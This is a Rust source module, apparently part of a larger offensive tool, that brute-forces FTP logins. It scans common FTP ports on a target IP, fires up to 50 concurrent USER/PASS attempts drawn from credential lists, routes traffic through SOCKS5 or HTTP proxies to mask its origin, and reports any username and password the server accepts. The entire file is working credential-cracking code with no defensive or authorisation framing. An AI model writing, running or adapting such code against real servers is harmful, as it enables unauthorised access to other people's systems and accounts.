use anyhow::Result;
use futures::stream::{FuturesUnordered, StreamExt};
use tokio::net::TcpStream;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio_socks::tcp::Socks5Stream;
use std::{
    sync::Arc,
    time::Duration,
};
use tokio::sync::{Semaphore, Notify};
use tokio::time::{timeout, sleep};
use crate::events::BruteEvent;
use crate::proxy::{build_proxy_client, build_direct_client};

/// FTP ports
const FTP_PORTS: &[u16] = &[21, 2121, 2100];
const CONNECT_TIMEOUT_SECS: u64 = 5;
const LOGIN_TIMEOUT_SECS: u64 = 8;
const MAX_RETRIES: usize = 2;
const INITIAL_CONCURRENCY: usize = 50;

/// Brute-force FTP for a single IP
pub async fn bruteforce_ip(
    ip: String,
    usernames: Arc<Vec<String>>,
    passwords: Arc<Vec<String>>,
    proxy: String,
) -> Vec<BruteEvent> {
    let mut events = Vec::new();
    let mut open_port = None;

    for &port in FTP_PORTS {
        if is_port_open(&ip, port, &proxy).await {
            open_port = Some(port);
            events.push(BruteEvent::Info(format!("FTP port {} open on {}", port, ip)));
            break;
        }
    }

    let port = match open_port {
        Some(p) => p,
        None => {
            events.push(BruteEvent::Fail(format!("No open FTP port on {}", ip)));
            return events;
        }
    };

    println!("[*] [Raw FTP] Brute-forcing {}:{} proxy={}", ip, port, if proxy.is_empty() { "none" } else { &proxy });

    let concurrency = Arc::new(Semaphore::new(INITIAL_CONCURRENCY));
    let found = Arc::new(Notify::new());
    let mut tasks = FuturesUnordered::new();

    for username in usernames.iter() {
        for password in passwords.iter() {
            let ip = ip.clone();
            let username = username.clone();
            let password = password.clone();
            let proxy = proxy.clone();
            let concurrency = concurrency.clone();
            let found = found.clone();

            tasks.push(tokio::spawn(async move {
                let _permit = concurrency.acquire_owned().await.unwrap();

                tokio::select! {
                    _ = found.notified() => Ok(None),
                    res = attempt_login_with_retry(ip, port, username, password, proxy) => {
                        match res {
                            Ok(success) => Ok(Some(success)),
                            Err(e) => Err(e),
                        }
                    }
                }
            }));
        }
    }

    while let Some(result) = tasks.next().await {
        match result {
            Ok(Ok(Some(success_string))) => {
                found.notify_waiters();
                let parts: Vec<&str> = success_string.splitn(2, ':').collect();
                events.push(BruteEvent::Success {
                    protocol: "FTP".to_string(),
                    ip: ip.clone(),
                    username: parts[0].to_string(),
                    password: parts[1].to_string(),
                    port,
                });
                return events;
            }
            Ok(Ok(None)) => {}
            Ok(Err(e)) => events.push(BruteEvent::Error(e.to_string())),
            Err(e) => events.push(BruteEvent::Error(format!("Join error: {}", e))),
        }
    }

    events.push(BruteEvent::Fail(format!("FTP brute-force failed on {}", ip)));
    events
}

/// Check if a port is open
async fn is_port_open(ip: &str, port: u16, proxy: &str) -> bool {
    let addr = format!("{}:{}", ip, port);

    if proxy.starts_with("socks5://") {
        let proxy_addr = proxy.trim_start_matches("socks5://");
        match timeout(Duration::from_secs(CONNECT_TIMEOUT_SECS), Socks5Stream::connect(proxy_addr, addr)).await {
            Ok(Ok(_)) => true,
            _ => false,
        }
    } else if proxy.starts_with("http://") || proxy.starts_with("https://") {
        match build_proxy_client(proxy) {
            Ok(client) => {
                let url = format!("ftp://{}:{}", ip, port);
                match timeout(Duration::from_secs(CONNECT_TIMEOUT_SECS), client.get(&url).send()).await {
                    Ok(Ok(resp)) => resp.status().is_success(),
                    _ => false,
                }
            }
            Err(_) => false,
        }
    } else {
        match timeout(Duration::from_secs(CONNECT_TIMEOUT_SECS), TcpStream::connect(&addr)).await {
            Ok(Ok(_)) => true,
            _ => false,
        }
    }
}

/// Attempt login with retries
async fn attempt_login_with_retry(ip: String, port: u16, username: String, password: String, proxy: String) -> Result<String> {
    for attempt in 0..=MAX_RETRIES {
        match timeout(Duration::from_secs(LOGIN_TIMEOUT_SECS), try_login(&ip, port, &username, &password, &proxy)).await {
            Ok(Ok(success)) => return Ok(success),
            Ok(Err(e)) => {
                if attempt == MAX_RETRIES {
                    return Err(e);
                } else {
                    sleep(Duration::from_millis(150)).await;
                }
            }
            Err(_) => {
                if attempt == MAX_RETRIES {
                    return Err(anyhow::anyhow!("Timeout on {}:{} for {}:{}", ip, port, username, password));
                } else {
                    sleep(Duration::from_millis(200)).await;
                }
            }
        }
    }
    Err(anyhow::anyhow!("Retries exhausted"))
}

/// Single login attempt (raw FTP commands)
async fn try_login(ip: &str, port: u16, user: &str, pass: &str, proxy: &str) -> Result<String> {
    let addr = format!("{}:{}", ip, port);

    let mut stream = if proxy.starts_with("socks5://") {
        let proxy_addr = proxy.trim_start_matches("socks5://");
        Socks5Stream::connect(proxy_addr, addr).await?.into_inner()
    } else {
        TcpStream::connect(&addr).await?
    };

    let mut buf = [0u8; 1024];

    // Read banner
    let _ = timeout(Duration::from_secs(5), stream.read(&mut buf)).await;

    // Send USER
    let user_cmd = format!("USER {}\r\n", user);
    stream.write_all(user_cmd.as_bytes()).await?;
    let _ = timeout(Duration::from_secs(5), stream.read(&mut buf)).await?;

    // Send PASS
    let pass_cmd = format!("PASS {}\r\n", pass);
    stream.write_all(pass_cmd.as_bytes()).await?;
    let n = timeout(Duration::from_secs(5), stream.read(&mut buf)).await??;

    let reply = String::from_utf8_lossy(&buf[..n]);

    if reply.contains("230") {
        Ok(format!("{}:{}", user, pass))
    } else {
        Err(anyhow::anyhow!("Login failed for {}:{}", user, pass))
    }
}
